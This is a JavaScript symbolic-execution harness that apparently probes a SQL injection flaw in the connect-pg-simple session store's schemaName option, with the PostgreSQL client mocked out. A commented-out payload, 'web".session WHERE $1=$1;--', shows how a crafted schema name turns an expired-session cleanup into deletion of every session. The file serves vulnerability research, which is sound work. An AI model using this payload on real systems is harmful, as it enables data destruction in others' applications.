const Symbolic = require('esl_symbolic');

require.cache[require.resolve('pg')] = {
  exports: (() => {
    const evt = { on() { }, removeListener() { }, emit() { } };

    class MockClient {
      constructor(config) {
        this.connection = { ...evt };
        Object.assign(this, evt);
      }
      connect(callback) {
        if (callback) callback(null);
        return Promise.resolve();
      }
      query(query, params, callback) {
        console.log('QUERY:', query);
        Symbolic.sinkCall('sql-injection', 'pg.query', query);
        if (params !== undefined) console.log('PARAMS:', params);
        const result = { rows: [], fields: [], rowCount: 0 };
        if (callback) callback(null, result);
        return Promise.resolve(result);
      }
      end() {
        return Promise.resolve();
      }
      release() { }
    }

    class MockPool {
      constructor(options) {
        this.ending = false;
        Object.assign(this, evt);
      }
      connect(callback) {
        const client = new MockClient();
        client.connect((err) => callback(err, client));
      }
      query(query, params, callback) {
        console.log('QUERY:', query);
        Symbolic.sinkCall('sql-injection', 'pg.query', query);
        if (params !== undefined) console.log('PARAMS:', params);
        const result = { rows: [], fields: [], rowCount: 0 };
        if (callback) callback(null, result);
        return Promise.resolve(result);
      }
      end(callback) {
        this.ending = true;
        if (callback) callback();
        return Promise.resolve();
      }
    }

    return {
      Client: MockClient,
      Pool: MockPool,
      Query: class { },
      Connection: class { },
      defaults: {},
      types: {},
      DatabaseError: Error,
      escapeIdentifier: (s) => '"' + s + '"',
      escapeLiteral: (s) => "'" + s + "'",
    };
  })(),
};


const { Client, Pool } = require("pg");
const session = require("express-session");
const connectPgSimple = require("connect-pg-simple");

function pgCfg() {
  return {
    host: process.env.PGHOST || "127.0.0.1",
    port: Number(process.env.PGPORT || 5434),
    user: process.env.PGUSER || "postgres",
    password: process.env.PGPASSWORD || "password",
    database: process.env.PGDATABASE || "connect_pg_simple_sqli",
  };
}

async function withPg(fn) {
  const client = new Client(pgCfg());
  await client.connect();
  try {
    return await fn(client);
  } finally {
    await client.end().catch(() => { });
  }
}

async function resetRows() {
  await withPg(async (client) => {
    await client.query(`DROP SCHEMA IF EXISTS web CASCADE;`);
    await client.query(`CREATE SCHEMA web;`);

    await client.query(`
      CREATE TABLE web.session (
        sid varchar NOT NULL,
        sess json NOT NULL,
        expire timestamp(6) NOT NULL,
        CONSTRAINT session_pkey PRIMARY KEY (sid)
      );
    `);

    await client.query(`
      INSERT INTO web.session (sid, sess, expire)
      VALUES
        ('expired', '{"user":"old"}', NOW() - INTERVAL '1 day'),
        ('future',  '{"user":"keep"}', NOW() + INTERVAL '1 day');
    `);
  });
}

function runStoreQuery(store, sql, params = []) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => {
      reject(new Error(`store.query timed out. SQL was:\n${sql}`));
    }, 8000);

    store.query(sql, params, (err, rows) => {
      clearTimeout(timer);
      if (err) return reject(err);
      resolve(rows);
    });
  });
}


async function destroyPools(pools) {
  for (const pool of pools) {
    await pool.end().catch(() => { });
  }
}

async function run() {
  let pools = [];
  const PGStore = connectPgSimple(session);
  // -----------------------------
  // 2) Exploit: malicious schema
  // -----------------------------
  await resetRows();

  const injectedPool = new Pool(pgCfg());
  pools.push(injectedPool);

  // const maliciousSchemaName = 'web".session WHERE $1=$1;--';
  const maliciousSchemaName = Symbolic.string('payload');
  // Trim path where table name is empty
  Symbolic.assume(maliciousSchemaName !== '');

  const injectedStore = new PGStore({
    pool: injectedPool,
    schemaName: maliciousSchemaName,
    tableName: "session",
    pruneSessionInterval: false,
    errorLog: () => { },
  });

  const injectedSql =
    `DELETE FROM ${injectedStore.quotedTable()} WHERE expire < to_timestamp($1)`;

  console.log("[injected quotedTable]", injectedStore.quotedTable());
  console.log("[injected SQL]", injectedSql);

  await runStoreQuery(
    injectedStore,
    injectedSql,
    [Math.floor(Date.now() / 1000)]
  );

  await destroyPools(pools);
}

run();
